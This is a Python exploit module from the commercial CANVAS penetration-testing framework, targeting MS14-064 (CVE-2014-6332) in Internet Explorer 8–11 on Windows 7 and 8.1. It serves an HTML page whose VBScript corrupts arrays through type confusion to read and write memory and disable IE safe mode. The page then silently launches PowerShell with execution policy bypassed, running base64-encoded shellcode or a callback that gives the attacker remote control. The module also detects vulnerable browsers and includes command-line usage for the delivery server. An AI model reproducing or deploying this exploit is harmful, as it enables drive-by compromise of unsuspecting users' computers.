#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2014
# http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement
import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from httpclientside import httpclientside

import sys
import canvasengine
import base64

from shellcode import shellcodeGenerator
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from httpclientside import httpclientside
from libs.spkproxy import header, body
from Nodes.mosdef_powershell.mosdef_powershell import *

NAME                            = "MS14_064 - Windows OLE Automation Array Remote Code Execution Vulnerability"
DESCRIPTION                     = "Clientside exploit for IE>7"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Microsoft"
DOCUMENTATION["Repeatability"]  = "Single"
DOCUMENTATION["References"]     = "https://technet.microsoft.com/library/security/MS14-064"
DOCUMENTATION["CVE Name"]       = "CVE-2014-6332"
DOCUMENTATION["CVE Url"]        = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6332"
DOCUMENTATION["NOTES"]          = """

References:
http://blog.trendmicro.com/trendlabs-security-intelligence/a-killer-combo-critical-vulnerability-and-godmode-exploitation-on-cve-2014-6332/
http://www.secniu.com/how-to-use-vbscript-to-turn-on-the-god-mode/

This exploit has been tested on:
* Windows 7 Professional EN (x32) with IE 8
* Windows 7 Ultimate N EN (x32) with IE 8
* Windows 7 Ultimate N EN (x32) with IE 9
* Windows 7 Ultimate N EN with SP1 (x32) with IE 9
* Windows 7 Ultimate N EN with SP1 (x32) with IE 10
* Windows 7 Ultimate N EN with SP1 (x32) with IE 11
* Windows 8.1 EN (x32) with IE 11

NOTE: With HTTP Callback Tunneling we inject a win32 shellcode
because the powershellNode doesn't support it yet.


Make sure to enable on the clientd response settings:
- Respond directly with exploit

If execution of scripts is disabled on the target system (default configuration),
the user will get a popup asking if they want powershell to make changes to their
system. In corporate environments it is very unlikely that execution of scripts
is disabled.

Command line usage:
$ python ./exploits/clientd/clientd.py -l 192.168.1.102 -d 5555 -O server_port:8080 -O allowed_attack_modules:ms14_064_ie_oleaut32 -O auto_detect_exploits:0
$ ./commandlineInterface.py -v23 -p5555

"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["Windows"] ]
PROPERTY['VERSION']             = ['7', '8']
PROPERTY['DELIVERY']            = 'HTTP'

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version        = 0
        self.name           = NAME
        # filename is used in the actual http server
        self.filename       = "".join( [ random.choice(string.uppercase) for x in range(8) ] ) + "00.html"
        self.badstring      = '\x00'
        # no refresh since we need to keep this running for a while
        self.refresh_rate   = 0
        self.use_leak       = False
        self.payload        = ""
        self.ps_command     = ""

    def is_vulnerable(self, info_dict):
        if "MSIE" in info_dict['user_agent']:
            for item in info_dict['user_agent'].split(";"):
                if "MSIE" in item:
                    break

            ie_ver = float(item[item.index(" ", 2) + 1:])

        elif ("Trident" in info_dict['user_agent'] and
              "rv:" in info_dict['user_agent']): #only for IE>=11 detection
            for item in info_dict['user_agent'].split(";"):
                if "rv:" in item:
                    break

            ie_ver = float(item[item.index(":") + 1:item.index(")")])

        else:
            self.log_error("Not vulnerable")
            return 0

        if ie_ver > 7:
            return 100
        else:
            self.log_error("Possibly vulnerable, but not with the current exploit version")
            return 0

    def create_shellcode(self):
        self.createWin32ClientSideShellcode()
        ps_shellcode = ''

        for b in self.shellcode:
            ps_shellcode +='0x' + b.encode("hex") + ','

        ps_shellcode = ps_shellcode[:-1]
        #self.log("Shellcode <%s>" % ps_shellcode)
        self.log_info("PS Shellcode len <%s>" % len(ps_shellcode))
        self.shellcode = ps_shellcode


    def generate_ps_payload(self):
        local_res = os.path.join(os.path.dirname(__file__), 'Resources')
        fscript   = os.path.join(local_res, 'ps_script.ps1')
        with open(fscript) as f:
                content = f.read()

        #create x32 shellcode
        self.create_shellcode()
        #replace shellcode
        dummy = 'A' + 'X' * 5917 + 'A'
        content = content.replace(dummy, self.shellcode)
        #with open("/tmp/powershell.ps1", "w") as f:
        #     f.write(content)

        #TODO:Compress
        payload = base64.b64encode(content)
        return payload

    def generate_ps_command_with_shellcode(self):
        command = """
        iex $(New-Object IO.StreamReader ($(New-Object IO.MemoryStream(,$([Convert]::FromBase64String('%s')))), [Text.Encoding]::ASCII)).ReadToEnd()
        """
        self.ps_command = command.rstrip().lstrip() % self.generate_ps_payload()
        return self.ps_command

    def generate_powershell_command(self):

        if self.HTTPMOSDEF:
            # Because the powershell node doesn't support HTTP.
            # Use a win32Node for this cases
            self.ps_command = self.generate_ps_command_with_shellcode()
        else:
            ps_mosdef = mosdef_powershell(self)
            ps_mosdef.createMosdefCallback()
            self.ps_command = ps_mosdef.generatePSCommand(b64encode=True,encoding="ASCII",compression=False)

        return self.ps_command

    def generate_html(self):
        PS_COMMAND = self.generate_powershell_command()
        html = """
                <html>
                <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" >
                <head></head>
                <body>

                <script LANGUAGE="VBScript">

                        function run()

                            On Error Resume Next
                            set obj_shell=createobject("Shell.Application")
                            obj_shell.ShellExecute "powershell.exe", "-NoP -NonI -Exec Bypass -c """ + PS_COMMAND + """", "", "", 0
                            set obj_shell = nothing

                        end function
                </script>

                <SCRIPT LANGUAGE="VBScript">

                dim   ax(),ay(),dummy()
                dim   asize,pos,over_pos,fakesa_pos,overflow,ini
                dim   fake_safearray
                dim   VARTYPE_BSTR : VARTYPE_BSTR         = 1.69759663316747E-313 ' 0000000800000008 ( BSTR type)
                dim   VARTYPE_VBLONG : VARTYPE_VBLONG     = 6.36598737437801E-314 ' 0000000300000003 ( vbLong type )
                dim   VARTYPE_AVARIANT : VARTYPE_AVARIANT = 1.74088534731324E-310 ' 0000200c0000200c ( array of Variant type )


                Init()

                sub make_fake_array()

                    'safeArray struct size = 32 bytes
                    fake_safearray = unescape("%u0001")                      'cDims ( %u0001 = 0x0100 = Array of BSTR )
                    fake_safearray = fake_safearray&unescape("%u0880")       'fFeaturetes
                    fake_safearray = fake_safearray&unescape("%u0001%u0000") 'cbElements ( Size per element )
                    fake_safearray = fake_safearray&unescape("%u0000%u0000") 'cLocks
                    fake_safearray = fake_safearray&unescape("%u0000%u0000") 'pvData ( data pointer )
                    fake_safearray = fake_safearray&unescape("%uffff%u7fff") 'rgsabound[0] -> cElements
                    fake_safearray = fake_safearray&unescape("%u0000%u0000") 'rgsabound[0] -> ILbound

                end sub

                function Init()

                    redim ax(5)
                    redim ay(5)
                    redim dummy(5)

                    ax(0)="XAAAAAAX"
                    ay(0)="XBBBBBBX"
                    ax(2)=1
                    ay(2)=1.1
                    redim preserve ax(10)
                    redim preserve ay(10)

                    asize = 20
                    ini=9

                    If create_arrays()=True Then
                        disable_safemode()
                        run()
  		    end if

		end function

                function create_arrays()

                    On Error Resume Next

                    dim c
                    create_arrays=False

                    For c = 0 To 600
                        If overlap()=True Then
                            create_arrays=True
                            Exit For
                        End If
                    Next
                end function


                function overlap()

                    On Error Resume Next

                    dim variant_type
                    overlap=False

                    asize= asize + ini
                    pos = asize + 1
                    over_pos = asize + 2
                    overflow = asize + &h8000000

                    'resizing the array
                    redim  Preserve ax(asize*2)
                    redim  Preserve ax(asize)
                    redim  ay(asize)
                    redim  Preserve ax(overflow)

                    ay(0)= VARTYPE_BSTR

                    'vartype = 0 -> NULL
                    if (IsObject(ax(pos)) = False and vartype(ax(pos)<>0)) then
                        if(IsObject(ax(over_pos)) = False ) then
                            variant_type=vartype(ax(over_pos))
                        end if
                    end if

                    'if finds the string vartype from ay(0) then the arrays are overlaped
                    if (variant_type=&h8) Then
                        overlap=True
                    end if

                    if (overlap = False) then
                        redim  Preserve ax(asize)
                    end if

                end function

                'function write_array(address,value)
                'end function

                function read_mem(address)

                    On Error Resume Next
                    redim  Preserve ax(overflow)
                    ay(0)=0

                    ax(over_pos)=address+4
                    'set by type confusion the BSTR type to use it like a string
                    ay(0)=VARTYPE_BSTR
                    'lenght of BSTR is in the first 4 bytes, so address+4-4=address
                    'lenb returns the value in address
                    read_mem=lenb(ax(over_pos))

                    'return the second array to the original value
                    ay(0)=0
                    'return the first array to the original size
                    redim  Preserve ax(asize)

                end function

                'write a variant object (0x10 bytes) with
                'the value in params in the indicated address
                function write_mem(address, value)

                    if (value = 0) then
                        ax(fakesa_pos)(address)=dummy(0)
                    else
                        'document.write("<br/> value : " & Hex(value))
                        ax(fakesa_pos)(address-8)=CLong(value)
                    end if
                    write_mem = True

                end function

                function leak_addr()

                    On Error Resume Next

                    'take the function pointer
                    'with this little trick:
                    func_ptr=make_fake_array
                    func_ptr=null
                    'now the func_ptr var contains
                    'the function pointer but the
                    'vartype is VT_NULL

                    'I can overwrite the vartype and
                    'extract the pointer
                    redim  Preserve ax(overflow)
                    ay(0)=0
                    ax(over_pos)=func_ptr
                    ay(0)=VARTYPE_VBLONG

                    leak_addr=ax(over_pos)
                    redim  Preserve ax(asize)

                end function

                function create_variant_array()

                    On Error Resume Next

                    redim  Preserve ax(overflow)
                    fakesa_pos = over_pos+2

                    'with this fake array i can r/w
                    'all the memory
                    make_fake_array()
                    ax(fakesa_pos)=fake_safearray
                    ay(2)= VARTYPE_AVARIANT
                    redim  Preserve ax(asize)

                end function

                function disable_safemode()

                    On Error Resume Next

                    create_variant_array()

                    func_add=leak_addr()
                    csep_ptr=read_mem(func_add+8) 'ptr CScriptEntryPoint
                    cole_ptr=read_mem(csep_ptr+16) 'ptr COleScript

                    'document.write("<br/> Hex func address : " & Hex(func_add))
                    'document.write("<br/> Hex CScriptEntreyPoint  address : " & Hex(csep_ptr))
                    'document.write("<br/> Hex COleScript  address : " & Hex(cole_ptr))

                    'for different IE versions
                    for k=&h10 to &h70 step 4

                        flag=read_mem(cole_ptr+&h120+k)

                        if(flag=&h0E) then

                            flag=0

                            redim  Preserve ax(overflow)
                            call write_mem(cole_ptr+&h120+k, flag )
                            redim  Preserve ax(asize)

                            Exit for
                        end if
                    next

                end function
                </script>
                </body>
                </html>
                """

        return html

    def makesploit(self, clientheader, clientbody):
        h = header('SERVER')
        b = body()

        if self.plugin_info:
            self.nlog("We got a plugin info for this target - thanks clientd!")
            info_dict   = self.plugin_info
            user_agent  = info_dict['user_agent']

            if self.is_vulnerable(info_dict):
                self.log_info("This client is most likely vulnerable")
            else:
                self.log_error("Bailing on this client as it is not likely to be vulnerable")
                return None, None
        else:
            user_agent = clientheader.getStrValue(['User-Agent'])

        if clientheader.URL.endswith(self.filename):
            self.nlog('Serving HTML file')

            html = self.generate_html()

            b.setBody(html)
            h.addHeader('Content-Type','text/html')

        elif clientheader.URL.count("exit"):
            self.log_error('Max retries reached. Exploit failed')
            h.status = '302'
            h.addHeader('Location',"http://www.google.com")
            h.addHeader('Content-Type','text/html')
            return h, b

        else:
            self.nlog('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type','text/html')

        return h, b

    def run(self):
        html = self.generate_html()

        self.nlog('Opening %s for output' % (self.filename))

        fd = file(self.filename,'wb+')
        fd.write(html)
        fd.close()
        self.nlog('Wrote to %s' % (self.filename))

        return 1

if __name__ == '__main__':
    exp = theexploit()
    ret = standard_callback_commandline(exp)

    if ret not in [0, 1, None]:
        ret.interact()
